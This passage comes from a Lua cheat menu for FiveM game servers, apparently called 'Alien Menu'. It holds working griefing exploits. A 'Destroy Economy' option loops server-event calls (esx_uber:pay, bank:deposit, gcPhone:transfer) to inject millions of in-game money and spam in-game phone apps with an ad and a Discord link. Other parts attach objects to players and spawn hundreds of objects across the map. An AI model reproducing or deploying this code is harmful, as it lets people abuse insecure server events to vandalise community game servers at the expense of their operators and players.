            0.0,
            0.0,
            0,
            true,
            true,
            false,
            true,
            1,
            true
        )
    else
        local eb = 'csx_seabed_rock3_'
        local ec = GetHashKey(eb)
        while not HasModelLoaded(ec) do
            Citizen.Wait(0)
            RequestModel(ec)
        end
        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
        AttachEntityToEntity(
            ed,
            GetPlayerPed(i),
            GetPedBoneIndex(GetPlayerPed(i), 0),
            0,
            0,
            -1.0,
            0.0,
            0.0,
            0,
            true,
            true,
            false,
            true,
            1,
            true
        )
    end
end

---------------------------Ekonomiyi Siker--------------------------------------

elseif data['Text'] == "Destroy Economy" then

    for i = 1, 1000 do
    
        Citizen.Wait(20)
        
        TriggerServerEvent('esx_uber:pay', 10000000)
    
        Citizen.Wait(10)
    
        TriggerServerEvent('lester:vendita')
    
        Citizen.Wait(10)
    
        TriggerServerEvent('houseRobberies:giveMoney')
    
        Citizen.Wait(20)
        
        TriggerServerEvent("bank:deposit", 10000000)
        
        Citizen.Wait(20)
        
        TriggerServerEvent('gcPhone:transfer', i, 10000000)
        
        Citizen.Wait(20)
        
        TriggerServerEvent('gcPhone:twitter_postTweets',
        "ID: " .. tostring(i) .. " lutfen bankana bak. Sana para gonderdik, bu parayi Alien Menu sayesinde yaptik.\nhttps://discord.gg/esxpublic",
        "https://cdn.discordapp.com/attachments/837292513428504577/839571795287736350/alien-head-vector_43623-96.png")
        
        Citizen.Wait(20)
        
        TriggerServerEvent('gcPhone:yellow_postIlan',
        "ID: " .. tostring(i) .. " lutfen bankana bak. Sana para gonderdik, bu parayi Alien Menu sayesinde yaptik.\ndhttps://discord.gg/esxpublic",
        "https://cdn.discordapp.com/attachments/837292513428504577/839571795287736350/alien-head-vector_43623-96.png")
    end
    
    -----------------------------------------------------------------

elseif data['Text'] == "Map Fucker (Mountain)" then

    CreateThread(function()
        CreateObject(841438406, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -3.1353807449341, 119.09279632568, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 29.801212310791, 212.17195129395, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 50.15075302124, 240.48179626465, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 132.52355957031, 209.7177734375, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 267.68319702148, 177.27178955078, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 399.44277954102, 256.72280883789, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 262.4895324707, 433.08334350586, 121.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 153.71487426758, 470.01754760742, 145.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -202.96701049805, 510.14642333984, 133.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -356.908203125, 521.6982421875, 125.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -419.99758911133, 548.14184570312, 123.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -626.81494140625, 690.35791015625, 151.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -886.74847412109, 861.11743164062, 200.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -740.39318847656, 617.63140869141, 141.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -708.70819091797, 572.42120361328, 148.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 27.549457550049, 247.41278076172, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 184.12426757812, 190.31451416016, 106.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 347.67337036133, 132.57824707031, 105.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 496.16052246094, 76.790908813477, 95.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 665.72528076172, 19.524644851685, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 840.81793212891, -88.717002868652, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 975.80151367188, -173.63159179688, 74.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1101.4017333984, -237.70246887207, 68.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1199.4383544922, -307.15908813477, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1213.1346435547, -378.9147644043, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1267.9310302734, -545.39172363281, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1367.3148193359, -580.54962158203, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1346.5030517578, -640.51617431641, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1292.5853271484, -724.26849365234, 66.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1244.8343505859, -751.23809814453, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1201.3557128906, -755.33068847656, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1170.6009521484, -838.49493408203, 54.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1165.1292724609, -950.17291259766, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1177.6690673828, -1049.4836425781, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1198.9270019531, -1102.0579833984, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1239.6254882812, -1197.4761962891, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1243.2370605469, -1258.1798095703, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1227.9265136719, -1343.5604248047, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1233.1948242188, -1396.0324707031, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1260.0971679688, -1450.5186767578, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1279.4130859375, -1515.7213134766, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1344.0708007812, -1611.6140136719, 55.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1391.5943603516, -1700.3395996094, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1406.8663330078, -1762.0474853516, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1427.9632568359, -1876.1088867188, 73.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1356.7377929688, -1986.7507324219, 59.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1246.3970947266, -2045.0302734375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1105.5281982422, -2072.205078125, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1031.8028564453, -2077.447265625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 891.376953125, -2072.0400390625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 755.24206542969, -2052.04296875, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 655.8369140625, -2045.7436523438, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 559.25738525391, -2039.2030029297, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 440.89465332031, -2107.9562988281, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 339.88040161133, -2158.240234375, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 110.77151489258, -2037.2709960938, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -5.143045425415, -2040.0140380859, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -127.17023468018, -2074.2487792969, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -245.7915802002, -2127.5544433594, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -343.80313110352, -2088.5659179688, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -449.30569458008, -2042.1713867188, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -570.93609619141, -1975.4478759766, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -699.91467285156, -1881.1365966797, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -735.6982421875, -1807.0490722656, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -745.45098876953, -1719.0440673828, 29.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -735.30694580078, -1635.3673095703, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -647.47534179688, -1493.9672851562, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -634.03802490234, -1375.2749023438, 10.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -555.75628662109, -1287.1246337891, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -525.64581298828, -1241.2718505859, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -447.78247070312, -1119.4261474609, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -69.776672363281, -1102.8891601562, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -41.347259521484, -1108.5306396484, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -29.609386444092, -1111.0249023438, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -15.035027503967, -1096.1140136719, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -29.862161636353, -1079.0012207031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -44.758968353271, -1079.9376220703, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -48.290916442871, -1087.099609375, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -40.295188903809, -10.8798828125, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 117.76248931885, -1072.2593994141, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 151.98278808594, -1078.2232666016, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 277.51858520508, -1041.4940185547, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 396.16189575195, -1026.4309082031, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 434.78796386719, -1016.8736572266, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 442.57867431641, -979.51953125, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 442.89279174805, -994.14184570312, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 447.28280639648, -1011.4274902344, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 218.35737609863, -945.61590576172, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 302.07806396484, -581.76257324219, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 308.75802612305, -583.85064697266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 317.50579833984, -595.49517822266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 335.30206298828, -596.66156005859, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 341.23889160156, -595.78839111328, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 364.81823730469, -591.33355712891, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 325.32833862305, -213.14144897461, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 330.37448120117, -191.72790527344, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 349.14260864258, -208.07083129883, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 337.06558227539, -241.4069519043, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 298.30191040039, -224.37821960449, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 285.634765625, -216.46199035645, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 262.62716674805, -198.80781555176, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 245.96669006348, -186.02375793457, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 916.44506835938, 37.975803375244, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 936.10784912109, 65.433235168457, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -175.96006774902, 851.95654296875, 232.2336730957, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -378.96408081055, -665.22149658203, 37.331523895264, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -400.55596923828, -684.08380126953, 38.648769378662, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -424.40484619141, -683.000976562, 41.7034034729, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -454.91082763672, -659.82568359375, 32.939640045166, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -526.60095214844, -655.23120117188, 33.032760620117, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -548.05670166016, -652.36499023438, 33.029022216797, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -549.81390380859, -697.82177734375, 33.038799285889, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -545.24224853516, -727.92510986328, 32.671539306641, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -520.80108642578, -754.56994628906, 31.823480606079, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -512.77209472656, -787.97338867188, 30.698291778564, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -511.87390136719, -818.08868408203, 30.118923187256, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -529.15905761719, -836.0380859375, 30.150640487671, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -551.88409423828, -832.03967285156, 28.91349029541, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -585.46600341797, -826.14312744141, 27.006490707397, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -610.14520263672, -821.81286621094, 25.464250564575, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.9306640625, -803.87738037109, 24.981843948364, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -637.81195068359, -785.80139160156, 25.130237579346, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -633.58489990234, -758.08648681641, 26.000982284546, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -629.87268066406, -734.35369873047, 27.382390975952, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -634.79791259766, -715.943359375, 28.945636749268, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -640.24420166016, -696.60284423828, 30.309741973877, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -634.990234375, -678.34259033203, 31.290117263794, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.08715820312, -654.33892822266, 31.468461990356, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -622.80981445312, -636.04864501953, 31.568452835083, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -624.82916259766, -617.20471191406, 32.589164733887, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.06488037109, -587.33911132812, 34.198680877686, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -631.78466796875, -571.66296386719, 34.756660461426, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -643.56799316406, -549.61889648438, 34.542552947998, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -640.8134765625, -537.90405273438, 34.997482299805, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -635.07604980469, -513.45190429688, 35.664726257324, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.10278320312, -421.34710693359, 34.564311981201, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -629.86151123047, -401.3056640625, 34.559482574463, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -631.65686035156, -380.25494384766, 34.561431884766, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -619.43371582031, -365.70248413086, 36.288410186768, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -613.52569580078, -337.9553527832, 36.612091064453, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -601.14410400391, -329.03750610352, 35.440940856934, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -623.30218505859, -322.57138061523, 36.568145751953, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -651.68695068359, -315.99667358398, 35.298564910889, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -660.08483886719, -294.44018554688, 35.33576965332, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -669.49005126953, -270.23934936523, 35.905090332031, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -675.63958740234, -254.40756225586, 36.236812591553, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -685.41461181641, -235.52954101562, 36.507305145264, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -699.59857177734, -220.75393676758, 36.83130645752, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -720.09216308594, -231.41983032227, 36.841335296631, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -744.83020019531, -244.68208312988, 36.840751647949, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -763.2548828125, -249.6580657959, 37.007606506348, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -788.52966308594, -256.30065917969, 37.245109558105, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -802.20819091797, -253.92761230469, 36.788028717041, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -808.58575439453, -242.59887695312, 37.036464691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -820.70690917969, -214.9810333252, 37.704189300537, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -830.81787109375, -191.96983337402, 37.444049835205, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -844.55413818359, -175.86039733887, 37.463500976562, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -858.94464111328, -159.00291442871, 37.669784545898, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -876.65307617188, -170.47099304199, 38.014739990234, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -901.49310302734, -183.6675567627, 37.530975341797, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -921.02185058594, -194.07048034668, 37.495845794678, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -944.10266113281, -195.88412475586, 37.495014190674, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -968.55554199219, -200.96894836426, 37.222003936768, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -988.82012939453, -220.45167541504, 37.907089233398, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1024.4562988281, -241.43873596191, 37.525581359863, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1085.2475585938, -274.20718383789, 37.617164611816, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1103.4658203125, -269.15484619141, 37.867721557617, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1126.8005371094, -281.48663330078, 38.657535552979, true, true, true)
